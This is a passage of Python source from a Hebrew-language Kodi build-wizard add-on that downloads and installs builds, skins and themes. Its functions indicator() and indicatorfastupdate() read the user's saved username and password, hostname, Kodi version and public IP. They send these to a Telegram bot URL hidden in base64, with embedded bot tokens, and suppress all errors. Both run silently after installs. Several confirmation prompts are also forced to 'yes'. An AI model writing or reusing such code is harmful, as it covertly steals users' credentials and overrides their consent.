                    progress_size = int(count * block_size)
                    if duration == 0:
                        duration = 0.1
                    speed = int(progress_size / (1024 * duration))
                    percent = int(count * block_size * 100 / total_size)
                    if speed > 1024 and not percent == 100:
                      eta =int(( (total_size - progress_size)/1024) / (speed) )
                    else:
                      eta=0
                    #sys.stdout.write("\r...%d%%, %d MB, %d KB/s, %d seconds passed" %(percent, progress_size / (1024 * 1024), speed, duration))
                    dp.update(int(percent),name, "\r%d%%,[COLOR salmon] %d MB / %d MB [/COLOR], %d KB/s " %(percent, progress_size / (1024 * 1024),total_size/(1000 * 1000), speed), '[B]ETA:[/B] [COLOR salmon]%02d:%02d[/COLOR]' % divmod(eta, 60))
                    count += 1
                    if dp.iscanceled():
                     dp.close()
                     break
    URL = "https://docs.google.com/uc?export=download"

    #session = requests.Session()

    #response = session.get(URL, params = { 'id' : id }, stream = True)
    import urllib2
    import cookielib

    from cookielib import CookieJar

    cj = CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    # input-type values from the html form
    formdata =  { 'id' : id }
    data_encoded = urllib.urlencode(formdata)
    logging.warning(URL+'&'+ data_encoded)
    response = opener.open(URL+'&'+ data_encoded)
    content = response.read()
    
    for cookie in cj:
         logging.warning( cookie)
    token = get_confirm_token(cj)
    logging.warning(token)
    if token:
        params = { 'id' : id, 'confirm' : token }
        headers = {'Access-Control-Allow-Headers': 'Content-Length'}
        data_encoded = urllib.urlencode(params)
        response = opener.open(URL+'&'+ data_encoded)
        chunk_read(response, report_hook=chunk_report,dp=dp,destination=destination,filesize=filesize)
        

    #save_response_content(response, destination)
    return(keys)
def kodi17Fix():
	addonlist = glob.glob(os.path.join(ADDONS, '*/'))
	disabledAddons = []
	for folder in sorted(addonlist, key = lambda x: x):
		addonxml = os.path.join(folder, 'addon.xml')
		if os.path.exists(addonxml):
			fold   = folder.replace(ADDONS, '')[1:-1]
			f      = open(addonxml)
			a      = f.read()
			aid    = parseDOM(a, 'addon', ret='id')
			f.close()
			try:
				add    = xbmcaddon.Addon(id=aid[0])
			except:
				try:
					log("%s was disabled" % aid[0], xbmc.LOGDEBUG)
					disabledAddons.append(aid[0])
				except:
					try:
						log("%s was disabled" % fold, xbmc.LOGDEBUG)
						disabledAddons.append(fold)
					except:
						if len(aid) == 0: log("Unabled to enable: %s(Cannot Determine Addon ID)" % fold, xbmc.LOGERROR)
						else: log("Unabled to enable: %s" % folder, xbmc.LOGERROR)
	if len(disabledAddons) > 0:
		x = 0
		DP.create(ADDONTITLE,'[COLOR %s]Enabling disabled Addons' % COLOR2,'', 'Please Wait[/COLOR]')
		for item in disabledAddons:
			x += 1
			prog = int(percentage(x, len(disabledAddons)))
			DP.update(prog, "", "Enabling: [COLOR %s]%s[/COLOR]" % (COLOR1, item))
			addonDatabase(item, 1)
			if DP.iscanceled(): break
		if DP.iscanceled(): 
			DP.close()
			LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Enabling Addons Cancelled![/COLOR]" % COLOR2)
			sys.exit()
		DP.close()
	forceUpdate()

def indicator():
       try:
          import json
          wiz.log('FRESH MESSAGE')
          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' - '+(socket.gethostbyaddr(socket.gethostname())[0])+' - '+userr +' - '+passs+' - '+kodiinfo+' - '+local_ip).readlines()
          #          x=urllib2.urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
       
def indicatorfastupdate():
       try:
          import json
          wiz.log('FRESH MESSAGE')
          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          #freshStart(name)
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2

          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' - '+(socket.gethostbyaddr(socket.gethostname())[0])+' - '+userr +' - '+passs+' - '+kodiinfo+' - '+local_ip).readlines()
          #          x=urllib2.urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass

def skinfix18():
	if KODIV>=18 and  os.path.exists(os.path.join(ADDONS, SKINID18)):
		workingxml = wiz.workingURL(SKINID18DDONXML)
		if workingxml == True:
			ver = wiz.parseDOM(wiz.openURL(SKINID18DDONXML), 'addon', ret='version', attrs = {'id': SKINID18})
			if len(ver) > 0:
				installzip = '%s-%s.zip' % (SKINID18, ver[0])
				workingrepo = wiz.workingURL(SKIN18ZIPURL+installzip)
				if workingrepo == True:
					DP.create(ADDONTITLE,'מתאים את הסקין לקודי שלך, אנא המתן....','', 'Please Wait')
					if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
					lib=os.path.join(PACKAGES, installzip)
					try: os.remove(lib)
					except: pass
					downloader.download(SKIN18ZIPURL+installzip,lib, DP)
					extract.all(lib, HOME,DP)
					try:
						old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
						new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
						os.rename(old_file, new_file)
					except:
						pass
					try:
						f = open(os.path.join(ADDONS, SKINID18, 'addon.xml'), mode='r'); g = f.read(); f.close()
						name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': SKINID18})
						wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, SKINID18, 'icon.png'))
					except:
						pass
					if KODIV >= 17: wiz.addonDatabase(SKINID18, 1)
					DP.close()
					xbmc.sleep(500)
					wiz.forceUpdate(True)
					wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				else: 
					wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
					wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
			else:
				wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
		else: 
			wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
			wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)
def skinfix17():
	if KODIV>=17 and KODIV<18 and os.path.exists(os.path.join(ADDONS, SKINID17)):
		workingxml = wiz.workingURL(SKINID17DDONXML)
		if workingxml == True:
			ver = wiz.parseDOM(wiz.openURL(SKINID17DDONXML), 'addon', ret='version', attrs = {'id': SKINID17})
			if len(ver) > 0:
				installzip = '%s-%s.zip' % (SKINID17, ver[0])
				workingrepo = wiz.workingURL(SKIN17ZIPURL+installzip)
				if workingrepo == True:
					DP.create(ADDONTITLE,'מתאים את הסקין לקודי שלך, אנא המתן....','', 'Please Wait')
					if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
					lib=os.path.join(PACKAGES, installzip)
					try: os.remove(lib)
					except: pass
					downloader.download(SKIN17ZIPURL+installzip,lib, DP)
					extract.all(lib, HOME,DP)
					try:
						old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
						new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
						os.rename(old_file, new_file)
					except:
						pass
					try:
						f = open(os.path.join(ADDONS, SKINID17, 'addon.xml'), mode='r'); g = f.read(); f.close()
						name = wiz.parseDOM(g, 'addon', ret='name', attrs = {'id': SKINID17})
						wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, name[0]), "[COLOR %s]Add-on updated[/COLOR]" % COLOR2, icon=os.path.join(ADDONS, SKINID17, 'icon.png'))
					except:
						pass
					if KODIV >= 17: wiz.addonDatabase(SKINID17, 1)
					DP.close()
					xbmc.sleep(500)
					wiz.forceUpdate(True)
					wiz.log("[Auto Install Repo] Successfully Installed", xbmc.LOGNOTICE)
				else: 
					wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid url for zip![/COLOR]" % COLOR2)
					wiz.log("[Auto Install Repo] Was unable to create a working url for repository. %s" % workingrepo, xbmc.LOGERROR)
			else:
				wiz.log("Invalid URL for Repo Zip", xbmc.LOGERROR)
		else: 
			wiz.LogNotify("[COLOR %s]Repo Install Error[/COLOR]" % COLOR1, "[COLOR %s]Invalid addon.xml file![/COLOR]" % COLOR2)
			wiz.log("[Auto Install Repo] Unable to read the addon.xml file.", xbmc.LOGERROR)
def fix17update():
	if KODIV>=17 and KODIV<18:
		wiz.kodi17Fix()
		xbmc.sleep(4000)
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")

		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.14.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.14.0%s/>'%m,'<import addon="xbmc.gui" version="5.12.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<keyboardlayouts default="true(.+?)/keyboardlayouts>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<keyboardlayouts default="true%s/keyboardlayouts>'%m,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')

def fix18update():
	if KODIV>=18:
		xbmc.sleep(4000)
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.12.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.12.0%s/>'%m,'<import addon="xbmc.gui" version="5.14.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<setting id="locale.keyboardlayouts" default="true%s/setting>'%m,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')


def buildWizard(name, type, theme=None, over=False):
	dialog = xbmcgui.DialogBusy()
	dialog.create()
	if over == False:
		testbuild = wiz.checkBuild(name, 'url')
		if USERNAME == '':
			ADDON.openSettings()
			sys.exit()
		if PASSWORD == '':
			ADDON.openSettings()
			sys.exit()

		if BUILDNAME=='':
			build_f=u_list(SPEEDFILE)
			(build_f)
		if testbuild == False:
			#DIALOG.ok(ADDONTITLE, "[COLOR %s]התקנה של הבילד אינה זמינה כעת, אנא נסו במועד מאוחר יותר.[/COLOR]" % COLOR2)
			#msg  = "[COLOR %s]בעיה בעדכון המהיר - באפשרותכם לעשות עדכון מהיר ידני בכפתור למטה או להתקין את הבילד מחדש.[/COLOR] [COLOR %s]%s[/COLOR][CR]" % (COLOR2, COLOR1, name)
			#wiz.ForceFastUpDate(ADDONTITLE, msg)
			#xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'אנא המתן')))
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
			xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")
			return
		testworking = wiz.workingURL(testbuild)
		if testworking == False:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Build Zip Error: %s[/COLOR]" % (COLOR2, testworking))
			return
	if type == 'gui':
		if name == BUILDNAME:
			if over == True: yes = 1
			else: yes = 1
		else: 
			yes = 1 #DIALOG.yesno("%s - [COLOR red]WARNING!![/COLOR]" % ADDONTITLE, "[COLOR %s][COLOR %s]%s[/COLOR] community build is not currently installed." % (COLOR2, COLOR1, name), "Would you like to apply the guiFix anyways?.[/COLOR]", nolabel='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')
		if yes:
			remove_addons()
			remove_addons2()
			debridit.debridIt('update', 'all')
			traktit.traktIt('update', 'all')
			buildzip = wiz.checkBuild(name,'gui')
			zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
			if not wiz.workingURL(buildzip) == True: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]' % COLOR2); return
			if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
			DP.create(ADDONTITLE,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name),'', 'אנא המתן')
			lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
			try: os.remove(lib)
			except: pass
			logging.warning(buildzip)
			if 'google' in buildzip:
			   res=googledrive_download(buildzip, lib, DP,wiz.checkBuild(name, 'filesize'))
			
			
			else:
			  downloader.download(buildzip, lib, DP)
			xbmc.sleep(100)
			title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
			DP.update(0, title,'', 'אנא המתן')
			extract.all(lib,HOME,DP, title=title)
			DP.close()
			wiz.defaultSkin()
			wiz.lookandFeelData('save')
			try:
				telemedia_android5fix()
			except:pass
			wiz.kodi17Fix()
			if KODIV>=18:
				skindialogsettind18()
			debridit.debridIt('restore', 'all')
			traktit.traktIt('restore', 'all')
			# xbmc.executebuiltin("ReloadSkin()")
			if INSTALLMETHOD == 1: todo = 1
			elif INSTALLMETHOD == 2: todo = 0
			else: DP.close()
			urlz = (NOTIFICATION2)
			remote_file = urllib2.urlopen(urlz)
			x=remote_file.readlines()
			found=0
	
#	if not input +'\r\n' in x:
			for us in x:
				if us.split(' ==')[0] =="noreset" or us.split()[0]=="noreset":
					# found=1
					xbmc.executebuiltin("ReloadSkin()")
					wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
					update_Votes()
					indicatorfastupdate()
				if us.split(' ==')[0] =="reset" or us.split()[0]=="reset":
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד יסגר![/COLOR]' % COLOR2)
					update_Votes()
					indicatorfastupdate()
					resetkodi()
			# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
			# update_Votes()
			# indicatorfastupdate()
            
            
            
            
			#else: DIALOG.ok(ADDONTITLE, "[COLOR %s]עדכון מהיר עבר בהצלחה, הקודי ייסגר כעת.[/COLOR]" % COLOR2); wiz.killxbmc()
		else:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]GuiFix: Cancelled![/COLOR]' % COLOR2)
	if type == 'gui2':
		if name == BUILDNAME:
			if over == True: yes = 1
			else: yes = 1
		else: 
			yes = 1 #DIALOG.yesno("%s - [COLOR red]WARNING!![/COLOR]" % ADDONTITLE, "[COLOR %s][COLOR %s]%s[/COLOR] community build is not currently installed." % (COLOR2, COLOR1, name), "Would you like to apply the guiFix anyways?.[/COLOR]", nolabel='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')
		if yes:
			remove_addons()
			remove_addons2()
			buildzip = wiz.checkBuild(name,'gui')
			zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
			if not wiz.workingURL(buildzip) == True: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]' % COLOR2); return
			if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
			DP.create(ADDONTITLE,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name),'', 'אנא המתן')
			lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
			try: os.remove(lib)
			except: pass
			logging.warning(buildzip)
			if 'google' in buildzip:
			   res=googledrive_download(buildzip, lib, DP,wiz.checkBuild(name, 'filesize'))
			
			
			else:
			  downloader.download(buildzip, lib, DP)
			xbmc.sleep(100)
			title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
			DP.update(0, title,'', 'אנא המתן')
			extract.all(lib,HOME,DP, title=title)
			DP.close()
			wiz.defaultSkin()
			wiz.lookandFeelData('save')
#			wiz.kodi17Fix()
			# xbmc.executebuiltin("ReloadSkin()")
			if INSTALLMETHOD == 1: todo = 1
			elif INSTALLMETHOD == 2: todo = 0
			else: DP.close()
			#else: DIALOG.ok(ADDONTITLE, "[COLOR %s]עדכון מהיר עבר בהצלחה, הקודי ייסגר כעת.[/COLOR]" % COLOR2); wiz.killxbmc()
		else:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]GuiFix: Cancelled![/COLOR]' % COLOR2)
	elif type == 'fresh':
		freshStart(name)
	elif type == 'normal':
		if url == 'normal':
			if KEEPTRAKT == 'true':
				traktit.autoUpdate('all')
				wiz.setS('traktlastsave', str(THREEDAYS))
			if KEEPREAL == 'true':
				debridit.autoUpdate('all')
				wiz.setS('debridlastsave', str(THREEDAYS))
			if KEEPLOGIN == 'true':
				loginit.autoUpdate('all')
				wiz.setS('loginlastsave', str(THREEDAYS))
		temp_kodiv = int(KODIV); buildv = int(float(wiz.checkBuild(name, 'kodi')))
		if not temp_kodiv == buildv: 
			if temp_kodiv == 16 and buildv <= 15: warning = False
			else: warning = True
		else: warning = False
		if warning == True:
			yes_pressed = 1
		else:
			if not over == False: yes_pressed = 1
			else: yes_pressed = DIALOG.yesno(ADDONTITLE, 'התקנה רגילה:' , 'מצב זה שומר הרחבות קיימות, האם להמשיך?', nolabel='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]המשך[/COLOR][/B]')
		if yes_pressed:
			wiz.clearS('build')
			buildzip = wiz.checkBuild(name, 'url')
			zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
			if not wiz.workingURL(buildzip) == True: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Build Install: Invalid Zip Url![/COLOR]' % COLOR2); return
			if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
			DP.create(ADDONTITLE,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]' % (COLOR2, COLOR1, name, wiz.checkBuild(name,'version')),'', 'אנא המתן')
			lib=os.path.join(PACKAGES, '%s.zip' % zipname)
			try: os.remove(lib)
			except: pass
			logging.warning(buildzip)
			if 'google' in buildzip:
			   res=googledrive_download(buildzip, lib, DP,wiz.checkBuild(name, 'filesize'))
			 
			   
			else:
			  downloader.download(buildzip, lib, DP)
			xbmc.sleep(1000)
			title = '[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]' % (COLOR2, COLOR1, name, wiz.checkBuild(name,'version'))
			DP.update(0, title,'', 'אנא המתן...')
			percent, errors, error = extract.all(lib,HOME,DP, title=title)
			if int(float(percent)) > 0:
				try:
					wiz.fixmetas()
				except: pass
				wiz.lookandFeelData('save')
				wiz.defaultSkin()
				#wiz.addonUpdates('set')
				wiz.setS('buildname', name)
				wiz.setS('buildversion', wiz.checkBuild( name,'version'))
				wiz.setS('buildtheme', '')
				wiz.setS('latestversion', wiz.checkBuild( name,'version'))
				wiz.setS('lastbuildcheck', str(NEXTCHECK))
				wiz.setS('installed', 'true')
				wiz.setS('extract', str(percent))
				wiz.setS('errors', str(errors))
				wiz.log('INSTALLED %s: [ERRORS:%s]' % (percent, errors))
				fastupdatefirstbuild(NOTEID)
				try:
					telemedia_android5fix()
				except:pass
				wiz.kodi17Fix()
				skin_homeselect()
				# skin_lower()
				# rdbuildinstall()
				# try: gaiaserenaddon()
				# except: pass
				# adults18()
				kodi17to18()
#				skinfix17()
				try: os.remove(lib)
				except: pass
				# rds = (ADDON.getSetting("auto_rd"))
				# if rds == 'true': 
					# try:
						# setautorealdebrid()
					# except: pass
				# try:
					# autotrakt()
				# except: pass
				# imdbs = (ADDON.getSetting("imdb_on"))
				# if imdbs == 'true': 
					# imdb_synck()
				# iptvset()
				#if KODIV >= 17: wiz.kodi17Fix()
				# if int(float(errors)) > 0:
					# yes=DIALOG.yesno(ADDONTITLE, '[COLOR %s][COLOR %s]%s v%s[/COLOR]' % (COLOR2, COLOR1, name, wiz.checkBuild( name,'version')), 'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]' % (COLOR1, percent, '%', COLOR1, errors), 'האם תרצה להציג שגיאות?[/COLOR]', nolabel='[B][COLOR red]לא תודה[/COLOR][/B]', yeslabel='[B][COLOR green]הצג שגיאות[/COLOR][/B]')
					# if yes:
						# if isinstance(errors, unicode):
							# error = error.encode('utf-8')
						# wiz.TextBox(ADDONTITLE, error)
				DP.close()
				themefile = wiz.themeCount(name)
				builde_Votes()
				indicator()
				if not themefile == False:
					buildWizard(name, 'theme')
				if KODIV >= 17: wiz.addonDatabase(ADDON_ID, 1)
				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: resetkodi()
#				else: DIALOG.ok(ADDONTITLE, "[COLOR %s]ההתקנה הסתיימה בהצלחה, ברוכים הבאים לקודי אנונימוס![/COLOR]" % COLOR2); backtokodi()
				if todo == 1: wiz.reloadFix()
				else: wiz.killxbmc(True)
			else:
				if isinstance(errors, unicode):
					error = error.encode('utf-8')
				file = open(lib, 'r') 
				txt_file= file.read() 
				res_txt=''
				for itemss in res:
				  res_txt='key: '+res_txt+'\n'+itemss
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'בעיה בהתקנה'), '[COLOR %s]יש לשנות את התאריך ליום אחד קודם[/COLOR]' % COLOR2)
				# wiz.TextBox("%s: בעיה בהתקנת הבילד" % ADDONTITLE, error+'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+res_txt)
		else:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]' % COLOR2)
	elif type == 'theme':
		if theme == None:
			themefile = wiz.checkBuild(name, 'theme')
			themelist = []
			if not themefile == 'http://' and wiz.workingURL(themefile) == True:
				themelist = wiz.themeCount(name, False)
				if len(themelist) > 0:
					if DIALOG.yesno(ADDONTITLE, "[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes" % (COLOR2, COLOR1, name, COLOR1, len(themelist)), "Would you like to install one now?[/COLOR]", yeslabel="[B][COLOR green]Install Theme[/COLOR][/B]", nolabel="[B][COLOR red]Cancel Themes[/COLOR][/B]"):
						wiz.log("Theme List: %s " % str(themelist))
						ret = DIALOG.select(ADDONTITLE, themelist)
						wiz.log("Theme install selected: %s" % ret)
						if not ret == -1: theme = themelist[ret]; installtheme = True
						else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Cancelled![/COLOR]' % COLOR2); return
					else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Cancelled![/COLOR]' % COLOR2); return
			else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: None Found![/COLOR]' % COLOR2)
		else: installtheme = DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to install the theme:' % COLOR2, '[COLOR %s]%s[/COLOR]' % (COLOR1, theme), 'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]' % (COLOR1, name, wiz.checkBuild(name,'version')), yeslabel="[B][COLOR green]Install Theme[/COLOR][/B]", nolabel="[B][COLOR red]Cancel Themes[/COLOR][/B]")
		if installtheme:
			themezip = wiz.checkTheme(name, theme, 'url')
			zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
			if not wiz.workingURL(themezip) == True: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]' % COLOR2); return False
			if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
			DP.create(ADDONTITLE,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, theme),'', 'Please Wait')
			lib=os.path.join(PACKAGES, '%s.zip' % zipname)
			try: os.remove(lib)
			except: pass
			downloader.download(themezip, lib, DP)
			xbmc.sleep(1000)
			DP.update(0,"", "Installing %s " % name)
			test = False
			if url not in ["fresh", "normal"]:
				test = testTheme(lib) if not wiz.currSkin() in ['skin.confluence', 'skin.estouchy','skin.estuary', 'skin.anonymous.mod', 'skin.anonymous.nox','skin.phenomenal','skin.Premium.mod'] else False
				test2 = testGui(lib) if not wiz.currSkin() in ['skin.confluence', 'skin.estouchy','skin.estuary', 'skin.anonymous.mod', 'skin.anonymous.nox','skin.phenomenal','skin.Premium.mod'] else False
				if test == True:
					wiz.lookandFeelData('save')
					skin = 'skin.confluence' if KODIV < 17 else 'skin.estuary' if KODIV < 17 else 'skin.anonymous.mod' if KODIV < 17 else 'skin.estouchy' if KODIV < 17 else 'skin.phenomenal' if KODIV < 17 else 'skin.anonymous.nox' if KODIV < 17 else 'skin.Premium.mod'
					gotoskin = xbmc.getSkinDir()
					#if DIALOG.yesno(ADDONTITLE, "[COLOR %s]Installing the theme [COLOR %s]%s[/COLOR] requires the skin to be swaped back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, theme, COLOR1, skin[5:]), "Would you like to switch the skin?[/COLOR]", yeslabel="[B][COLOR green]Switch Skin[/COLOR][/B]", nolabel="[B][COLOR red]Don't Switch[/COLOR][/B]"):
					skinSwitch.swapSkins(skin)
					x = 0
					xbmc.sleep(1000)
					while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
						x += 1
						xbmc.sleep(1000)
					if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
						wiz.ebi('SendClick(11)')
					else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]' % COLOR2); return
					xbmc.sleep(1000)
			title = '[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, theme)
			DP.update(0, title,'', 'אנא המתן')
			percent, errors, error = extract.all(lib,HOME,DP, title=title)
			wiz.setS('buildtheme', theme)
